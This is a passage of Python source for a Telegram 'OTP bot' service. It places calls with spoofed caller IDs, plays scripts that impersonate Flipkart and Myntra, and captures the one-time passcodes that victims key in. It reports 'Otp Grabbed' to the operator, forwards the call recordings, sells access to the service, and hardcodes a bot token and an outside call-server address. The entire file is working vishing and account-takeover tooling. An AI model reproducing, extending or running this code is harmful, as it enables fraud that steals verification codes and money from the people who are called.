    bot.send_message(id,"*♛ WELCOME TO OG OTP BOT ♛\n\n1»» How To Make Call Using This Bot\n\n/call (Customer Number) (Spoof Number) (OTP Digit) (Script ID) (Voice Name)\n\nExample - *`/call 9195xxxxx749 918xxx00 4 646a64a3b89b1e2299a20570 hi-IN-Neural2-D` *\n\n2»» How To Get Voice Name ?\n\nCurrently We Support 400+ Voices & Language. To See & Select The Voice Use Command /voice\n\n\n [+] Scripts Available In Our Bot \n\n»» Flipkart Hindi ->  *`646a4b048e4aa6225ea14f6d`* \n»» Flipkart English -> *`646a5cc59d312622a3628c59`* \n»» Myntra Login -> *`646a64a3b89b1e2299a20570`*\n\n Use Any Of The Script To Make Call *",parse_mode='Markdown')




@bot.message_handler(commands=['voice'])
def custovoice(message):
    print('voice')
    keyboard = types.InlineKeyboardMarkup()
    item1 = types.InlineKeyboardButton("ES",callback_data="ES")
    item2 = types.InlineKeyboardButton("IN",callback_data="IN")
    item3 = types.InlineKeyboardButton("SE",callback_data="SE")
    item4 = types.InlineKeyboardButton("HK",callback_data="HK")
    item5 = types.InlineKeyboardButton("CN",callback_data="CN")
    item6 = types.InlineKeyboardButton("TW",callback_data="TW")
    item7 = types.InlineKeyboardButton("US",callback_data="US")
    item8 = types.InlineKeyboardButton("JP",callback_data="JP")
    item9 = types.InlineKeyboardButton("BE",callback_data="BE")
    item10 = types.InlineKeyboardButton("ZA",callback_data="ZA")
    item11 = types.InlineKeyboardButton("XA",callback_data="XA")
    item12 = types.InlineKeyboardButton("BG",callback_data="BG")
    item13 = types.InlineKeyboardButton("CZ",callback_data="CZ")
    item14 = types.InlineKeyboardButton("DK",callback_data="DK")
    item15 = types.InlineKeyboardButton("DE",callback_data="DE")
    item16 = types.InlineKeyboardButton("AU",callback_data="AU")
    item17 = types.InlineKeyboardButton("GB",callback_data="GB")
    item18 = types.InlineKeyboardButton("FI",callback_data="FI")
    item19 = types.InlineKeyboardButton("CA",callback_data="CA")
    item20 = types.InlineKeyboardButton("FR",callback_data="FR")
    item21 = types.InlineKeyboardButton("IL",callback_data="IL")
    item22 = types.InlineKeyboardButton("HU",callback_data="HU")
    item23 = types.InlineKeyboardButton("IS",callback_data="IS")
    item24 = types.InlineKeyboardButton("LT",callback_data="LT")
    item25 = types.InlineKeyboardButton("LV",callback_data="LV")
    item26 = types.InlineKeyboardButton("MY",callback_data="MY")
    item27 = types.InlineKeyboardButton("NO",callback_data="NO")
    item28 = types.InlineKeyboardButton("NL",callback_data="NL")
    item29 = types.InlineKeyboardButton("BR",callback_data="BR")
    item30 = types.InlineKeyboardButton("PT",callback_data="PT")
    item31 = types.InlineKeyboardButton("RO",callback_data="RO")
    item32 = types.InlineKeyboardButton("RU",callback_data="RU")
    item33 = types.InlineKeyboardButton("SK",callback_data="SK")
    item34 = types.InlineKeyboardButton("RS",callback_data="RS")
    item35 = types.InlineKeyboardButton("TH",callback_data="TH")
    item36 = types.InlineKeyboardButton("UA",callback_data="UA")
    item37 = types.InlineKeyboardButton("VN",callback_data="VN")
    item38 = types.InlineKeyboardButton("PL",callback_data="PL")
    item39 = types.InlineKeyboardButton("TR",callback_data="TR")
    item40 = types.InlineKeyboardButton("ID",callback_data="ID")
    item41 = types.InlineKeyboardButton("PH",callback_data="PH")
    item42 = types.InlineKeyboardButton("IT",callback_data="IT")
    item43 = types.InlineKeyboardButton("GR",callback_data="GR")
    item44 = types.InlineKeyboardButton("KR",callback_data="KR")
    item45 = types.InlineKeyboardButton("ph",callback_data="ph")

    keyboard.add(item1, item2,item3,item4,item5,item6,item7,item8,item9,item10,item11, item12,item13,item14,item15,item16,item17,item18,item19,item20,item21, item22,item23,item24,item25,item26,item27,item28,item29,item30,item31, item32,item33,item34,item35,item36,item37,item38,item39,item40,item41,item42,item43,item44,item45)
    bot.send_message(message.chat.id,f"* 🎶 Available Countries In Our Bot 🎶 \n\n *", reply_markup=keyboard,parse_mode='markdown')


@bot.message_handler(commands=['call'])
def customvoice(message):
    params = message.text.split()[1:]
    if check_expiry_days(message.chat.id):
    #print(len(params))
        if int(len(params)) == 5:
            to_number = params[0]
            save_tophonenumber(to_number,message.chat.id)
            if to_number.isnumeric():
                from_number = params[1]
                save_fromphonenumber(from_number,message.chat.id)
                if from_number.isnumeric():
                    digits = params[2]
                    if digits.isnumeric():
                        bin_id = params[3]
                        if check_script(bin_id,api_key):
                            voic = params[4]
                            if voic in google_voice_name:
                                #bot.send_message(chat_id,from_number,to_number,digits,bin_id,voic)
                                language_code = f"{voic.split('-')[0]}-{voic.split('-')[1]}"
                                #print(language_code)
                                print(fetch_flag(message.chat.id))
                                num = from_number
                                mgid = message.chat.id
                                save_fromphonenumber(num,mgid)
                                send1 = bot.send_message(message.chat.id,f"* [📞]Calling: `{to_number} \n[📲]Calling From: {from_number}\n[🎵]Voice Used: {voic} \n[📃]OTP Digits: {digits} *",parse_mode='markdown')
                                data = {
                                    "from" : f"{from_number}",
                                    "to":f"{to_number}",
                                    "bin_id":f"{bin_id}",
                                    "language":f"{language_code}",
                                    "voicename":f"{voic}",
                                    "digits":f"{digits}",
                                    "bot_token":f"5964382315:AAHPVl_uIReHUGhnGq6MtmBtXN3tnr3yKXA",
                                    "chat_id":f"{message.chat.id}"
                                }
                                a = requests.post(f"{callurl}/makecall",data = data)
                                print(a)
                            else:
                                send1 = bot.send_message(message.chat.id,f"*❌ Invalid Voice Name ❌\n\n  Please Check The Voice Name  \n\n By : *`/voice`* *",parse_mode='markdown')


                        else:
                            send1 = bot.send_message(message.chat.id,f"*❌ Invalid Bin ID ❌\n\n  Please Create The Script Again \n\n By : *`/createscript`* *",parse_mode='markdown')

                    else:
                        send1 = bot.send_message(message.chat.id,f"*❌ Invalid Digits ❌\n\n 🤖 Dont Include + In Number Only Numeric Characters Allowed 🤖/call 919522486207 918035067017 6 6475b3f4b89b1e2299a7319c hi-IN-Neural2-D \n\n Ex. *`/call 919522486207 918035067017 6 6475b3f4b89b1e2299a7319c hi-IN hi-IN-Neural2-D`* *",parse_mode='markdown')

                else:
                    print('error')
                    send1 = bot.send_message(message.chat.id,f"*❌ Invalid From Number ❌\n\n 🤖 Dont Include + In Number Only Numeric Characters Allowed 🤖/call 919522486207 918035067017 6 6475b3f4b89b1e2299a7319c hi-IN-Neural2-D \n\n Ex. *`/call 919522486207 918035067017 6 6475b3f4b89b1e2299a7319c hi-IN hi-IN-Neural2-D`* *",parse_mode='markdown')
            
            else:
                print('error')
                send1 = bot.send_message(message.chat.id,
                                    f"*❌ Invalid To Number ❌\n\n 🤖 Dont Include + In Number Only Numeric Characters Allowed 🤖/call 919522486207 918035067017 6 6475b3f4b89b1e2299a7319c hi-IN-Neural2-D \n\n Ex. *`/call 919522486207 918035067017 6 6475b3f4b89b1e2299a7319c hi-IN hi-IN-Neural2-D`* *",parse_mode='markdown')
            

        else:
        #print('error')
            send = bot.send_message(message.chat.id,
                                    f"*❌ Invalid Format ❌\n\n 🤖 Please Use Format as Given Below 🤖 \n \n *`/call <to_number> <from_number> <digits> <bin_id> <Voice_Name>`* \n\n Ex. *`/call 919522486207 918035067017 6 6475b3f4b89b1e2299a7319c hi-IN-Neural2-D`* *",parse_mode='markdown')
    else:
        keyboardd = types.InlineKeyboardMarkup()
        name = message.from_user.first_name
        item1 = types.InlineKeyboardButton('[💰] Buy Access [💰]', url='t.me/redlinegod_1')
        keyboardd.add(item1)
        send = bot.send_message(message.chat.id,
                               f"*❌Hey,  {name}  Mate You Are Not Authorized To Use This Bot🤖*",reply_markup=keyboardd,parse_mode='Markdown')

@bot.message_handler(commands=['status'])
def botstat(message):
    print("Working")
    bot.send_message(message.chat.id,f"*The OG Bot is currently fully functional and it has been up From \n ⏳ {time.time()-bot_start:.2f} seconds*" , parse_mode="Markdown")

@app.route('/', methods=['GET', 'POST'])
def webhook():
    if request.headers.get("content-type") == "application/json":
        json_string = flask.request.get_data().decode('utf-8')
        update = telebot.types.Update.de_json(json_string)
        bot.process_new_updates([update])
        return ''
    else:
        print("error")
        flask.abort(200)



@app.route("/makecall/", methods=["POST"])
def makecall():
    from_no = request.form.get('from')
    to_no = request.form.get('to')
    bin_id = request.form.get('bin_id')
    language = request.form.get('language')
    voiceName = request.form.get('voicename')
    digits = int(request.form.get('digits'))
    bot_token = request.form.get('bot_token')
    chat_id = request.form.get('chat_id')
    userid = chat_id
    
    try:
        jsn = get_script(bin_id,api_key)
        first_part = jsn['sc_1']
        post_data = f'{to_no}|{from_no}|{bin_id}|{language}|{voiceName}|{digits}|{bot_token}|{chat_id}'

    except:
        pass
        requests.post(f"https://api.telegram.org/bot{bot_token}/sendMessage?chat_id={chat_id}&parse_mode=Markdown&text=*❌ Invalid Script ID ❌*")


    try:   
        url3 = "http://188.212.124.147:8800/api/v1/call/gather"
 
        payload = {
            "callee": to_no,
            "callerId": from_no,
            "languageCode": f"{language}",
            "voiceName": f"{voiceName}",
            "introductoryText": f" ",
            "ivrMenuText": f"{first_part}",
            "goodByeText": " ",
            "dtmfCount": 1,
            "callBackUrl": f"{callurl}/step2/{post_data}"
        }
        #print(headers)
        response = requests.post(url3, headers=headers, json=payload)
        #print(headers)
        print(response.text)
        json_data = json.loads(response.text)
        action_response = json_data['actionResponse']
        time = json_data['callInitiationTime']
        if action_response == 'Success':
            bot.send_message(chat_id,'*📞 Ringing......*',parse_mode='Markdown')
        else:
            bot.send_message(chat_id,"Call failed. Contact Admin")
        return Response(status=200)
    except:
        return Response(status=200)



@app.route('/step2/<userid>', methods=['GET', 'POST'])
def step2(userid):
    data = userid
    print(data)
    #post_data = f'{to_no}|{from_no}|{bin_id}|{language}|{voiceName}|{digits}|{bot_token}|{chat_id}'
    bin_id = data.split('|')[2]
    langu = data.split('|')[3]
    voiccc = data.split('|')[4]
    digittt = data.split('|')[5]
    chat_id = data.split('|')[7]
    print(request.data)
    try:
        jsn = get_script(bin_id,api_key)
        second_part = jsn['sc_2']
    
    except:
        pass
    url = "http://188.212.124.147:8800/api/v1/call/gather-play"
    try:
        if request.method == 'POST':
            json_data = json.loads(request.data.decode('utf-8'))
            if 'event' in list(json_data.keys()):
                #print('On call')
                event = json_data['event']
                print(event)
                if event == 'INITIATED':
                   bot.send_message(chat_id,f"*Call initiated.*")
                if event == 'RINGING':
                    bot.send_message(chat_id,f"*Call ringing...*")
                if event == 'BRIDGING':
                    bot.send_message(chat_id,f"*Connecting the call...*")
                if event == 'BRIDGED':
                    bot.send_message(chat_id,f"*Call connected...*")
                if event == 'DTMF_IN_CONFERENCE':
                    pass
                if event == 'ANSWERED':
                    bot.send_message(chat_id,f"*Call answered.*")
                if event == 'FAILED':
                    bot.send_message(chat_id,f"*Call failed.*")
                if event == 'BUSY':
                    bot.send_message(chat_id,f"*This number is busy.*")
                if event == 'HANGUP':
                    hangup_code = json_data['hangupCode']
                    hangup_cause = json_data['hangupCause']
                    duration = json_data['callDuration']
                    recording = json_data['recordingUrl']
                    try:
                        uuid = recording.split('/')[-1]
                        
                        response = requests.get(recording, headers=headers, stream=True)

                        with open(f'./records/{uuid}.mp3', 'wb') as f:
                            for chunk in response.iter_content(chunk_size=1024):
                                if chunk:
                                    f.write(chunk)
                        audio_file = open(f'./records/{uuid}.mp3', 'rb')

                        bot.send_audio(chat_id, audio_file)

                        audio_file.close()            

                        if hangup_cause == 'Normal Clearing':
                            bot.send_message(chat_id,f"* Call was hung up - {duration} seconds *")
                        else:
                            bot.send_message(chat_id,f"* Call was hung up - {duration} seconds *")
                    except:
                        pass
            if 'digit' in list(json_data.keys()):
                uuid = json_data['uuid']
                bot.send_message(chat_id,f"🤳 Victim Pressed ! :{json_data['digit']}")
                bot.send_message(chat_id,f"🧑‍💻 Send otp Now 🧑‍💻")

                print(uuid)
                payload = {
                    "callUUID": uuid,
                    "languageCode": f"{langu}",
                    "voiceName": f"{voiccc}",
                    "ivrMenuText": f"{second_part}",
                    "dtmfCount": int(digittt),
                    "callBackUrl": f"{callurl}/step3/{data}"
                }
                response = requests.post(url, headers=headers, json=payload)
                print(response.text)
    except Exception as e:
        print(e)
        return Response(status=200)
    return Response(status=200)



@app.route('/step3/<userid>', methods=['GET', 'POST'])
def step3(userid):
    data = userid
    print(data)
    #post_data = f'{to_no}|{from_no}|{bin_id}|{language}|{voiceName}|{digits}|{bot_token}|{chat_id}'
    bin_id = data.split('|')[2]
    langu = data.split('|')[3]
    voiccc = data.split('|')[4]
    digittt = data.split('|')[5]

    chat_id = data.split('|')[7]
    try:
        jsn = get_script(bin_id,api_key)
        third_part = jsn['sc_3']
        last_part = jsn['sc_4']
    
    except:
        pass

    url = "http://188.212.124.141:8800/api/v1/call/gather-play"
    print(request.data)
    
    try:
        if request.method == 'POST':
            json_data = json.loads(request.data.decode('utf-8'))
            uuid = json_data['uuid']
            if 'event' in list(json_data.keys()):
                #print('On call')
                event = json_data['event']
                if event == 'INITIATED':
                   bot.send_message(chat_id,f"*Call initiated.*")
                if event == 'RINGING':
                   bot.send_message(chat_id,f"*Call ringing...*")
                if event == 'BRIDGING':
                   bot.send_message(chat_id,f"*Connecting the call...*")
                if event == 'BRIDGED':
                   bot.send_message(chat_id,f"*Call connected...*")
                if event == 'DTMF_IN_CONFERENCE':
                    pass
                if event == 'ANSWERED':
                   bot.send_message(chat_id,f"*Call answered.*")
                if event == 'FAILED':
                   bot.send_message(chat_id,f"*Call failed.*")
                if event == 'BUSY':
                   bot.send_message(chat_id,f"*This number is busy.*")
                if event == 'HANGUP':
                    hangup_code = json_data['hangupCode']
                    hangup_cause = json_data['hangupCause']
                    duration = json_data['callDuration']
                    recording = json_data['recordingUrl']
                    try:
                        uuid = recording.split('/')[-1]
                        
                        response = requests.get(recording, headers=headers, stream=True)

                        with open(f'./records/{uuid}.mp3', 'wb') as f:
                            for chunk in response.iter_content(chunk_size=1024):
                                if chunk:
                                    f.write(chunk)
                        audio_file = open(f'./records/{uuid}.mp3', 'rb')

                        bot.send_audio(chat_id, audio_file)

                        audio_file.close()            

                        if hangup_cause == 'Normal Clearing':
                            bot.send_message(chat_id,f"*Call was hung up - {duration} seconds*")
                        else:
                            bot.send_message(chat_id,f"*Call was hung up - {duration} seconds*")
                    
                        return Response(status=200)
                    except:
                        return Response(status=200)
            if 'digit' in list(json_data.keys()):
                print('here')
                print(json_data['digit'])
                #send1 = bot.send_message(chat_id,f"* Otp Grabbed : *`{json_data['digit']}`* *",parse_mode='markdown')
                keyboard = types.InlineKeyboardMarkup()

                item1 = types.InlineKeyboardButton("Accept",callback_data="accept")
                item2 = types.InlineKeyboardButton("Deny",callback_data="deny")
                keyboard.add(item1, item2)
                acc = fetch_flag(chat_id)
                bot.send_message(chat_id,f"*🚨 Otp Grabbed : *`{json_data['digit']}`* *",reply_markup=keyboard,parse_mode='markdown')
                time.sleep(15)
                if acc == '1'or acc == 1:
                    url = "http://188.212.124.147:8800/api/v1/call/gather-play"

                    payload = {
                        "callUUID": uuid,
                        "languageCode": f"{langu}",
                        "voiceName": f"{voiccc}",
                        "goodByeText": f"{last_part}",#f"Your identity has been successfully verified. We will review your account and get back to you within 24 hours. You may end this call at any time. Need to speak with a live customer support agent? log in to your mobile banking app or web browser and navigate over to the customer support section, one of our many team members help you resolve your inquiry. is it time for a new credit card? log in to your mobile banking app or web browser and check your eligiblity on one of our many offered credit cards. you may end this call at any time.",
                        "dtmfCount": 0,
                        "callBackUrl": f"{callurl}/callback/{data}"
                    }
                    response = requests.post(url, headers=headers, json=payload)
                    json_data = json.loads(response.text)
                    print(response.text)
                    return Response(status=200)
                else:
                    bot.send_message(chat_id,f"Send otp Now")
                    url1 = "http://188.212.124.147:8800/api/v1/call/gather-play"
                    print(third_part)
                    payload = {
                        "callUUID": uuid,
                        "languageCode": f"{langu}",
                        "voiceName": f"{voiccc}",
                        "ivrMenuText": f"{third_part}",
                        "dtmfCount": int(digittt),
                        "callBackUrl": f"{callurl}/step3/{data}"
                    }
                    response = requests.post(url1, headers=headers, json=payload)
                    print(response.text)
                    return Response(status=200)
    
    except Exception as e:
        return Response(status=200)

@app.route('/callback/<userid>', methods=['GET', 'POST'])
def callback(userid):
    data = userid
    print(data)
    #post_data = f'{to_no}|{from_no}|{bin_id}|{language}|{voiceName}|{digits}|{bot_token}|{chat_id}'
    bin_id = data.split('|')[2]
    langu = data.split('|')[3]
    voiccc = data.split('|')[4]
    digittt = data.split('|')[5]

    chat_id = data.split('|')[7]
    try:
        jsn = get_script(bin_id,api_key)
        third_part = jsn['sc_3']
        last_part = jsn['sc_4']
    
    except:
        pass

    if request.method == 'POST':
        json_data = json.loads(request.data.decode('utf-8'))
        uuid = json_data['uuid']
        try:
            #{"uuid":"87f137ef-30e4-4b4d-89a5-41fa80685216","event":"HANGUP","callDuration":8,"hangupCause":"Normal Clearing","hangupCode":16,"recordingUrl":"http://188.212.124.147:8800/api/v1/call/file/87f137ef-30e4-4b4d-89a5-41fa80685216"}'
            if 'event' in list(json_data.keys()):
                event = json_data['event']
                print(event)
                if event == 'INITIATED':
                    bot.send_message(chat_id,f"*Call initiated.*")
                if event == 'RINGING':
                    bot.send_message(chat_id,f"*Call ringing...*")
                if event == 'BRIDGING':
                    bot.send_message(chat_id,f"*Connecting the call...*")
                if event == 'BRIDGED':
                    bot.send_message(chat_id,f"*Call connected...*")
                if event == 'DTMF_IN_CONFERENCE':
                    pass
                if event == 'ANSWERED':
                    bot.send_message(chat_id,f"*Call answered.*")
                if event == 'FAILED':
                    bot.send_message(chat_id,f"*Call failed.*")
                if event == 'BUSY':
                    bot.send_message(chat_id,f"*This number is busy.*")
                if event == 'User busy':
                    bot.send_message(chat_id,f"*User is busy.*")
                if event == 'HANGUP':
                    hangup_code = json_data['hangupCode']
                    hangup_cause = json_data['hangupCause']
                    duration = json_data['callDuration']
                    recording = json_data['recordingUrl']
                    try:
                        uuid = recording.split('/')[-1]
                        
                        response = requests.get(recording, headers=headers, stream=True)

                        with open(f'./records/{uuid}.mp3', 'wb') as f:
                            for chunk in response.iter_content(chunk_size=1024):
                                if chunk:
                                    f.write(chunk)
                        audio_file = open(f'./records/{uuid}.mp3', 'rb')

                        bot.send_audio(chat_id, audio_file)

                        audio_file.close()            

                        if hangup_cause == 'Normal Clearing':
                            bot.send_message(chat_id,f"*Call was hung up - {duration} seconds*")
                        else:
                            bot.send_message(chat_id,f"*Call was hung up - {duration} seconds*")
                    except:
                        print('Audio error ')
                        return Response(status=200)
            '''else:
                url = "http://188.212.124.147:8800/api/v1/call/gather-play"

                payload = {
                    "callUUID": uuid,
                    "languageCode": f"{langu}",
                    "voiceName": f"{voiccc}",
                    "goodByeText": f"Please Wait",#f"Your identity has been successfully verified. We will review your account and get back to you within 24 hours. You may end this call at any time. Need to speak with a live customer support agent? log in to your mobile banking app or web browser and navigate over to the customer support section, one of our many team members help you resolve your inquiry. is it time for a new credit card? log in to your mobile banking app or web browser and check your eligiblity on one of our many offered credit cards. you may end this call at any time.",
                    "dtmfCount": 0,
                    "callBackUrl": f"{callurl}/callback/{data}"
                }
                response = requests.post(url, headers=headers, json=payload)
                json_data = json.loads(response.text)
                print(response.text)
                return Response(status=200)'''
            return Response(status=200)
        except:
            return Response(status=200)



bot_start = time.time()


if __name__ == '__main__':
    app.run(debug=True)

if __name__ == '__main__':
    bot.polling(none_stop=True)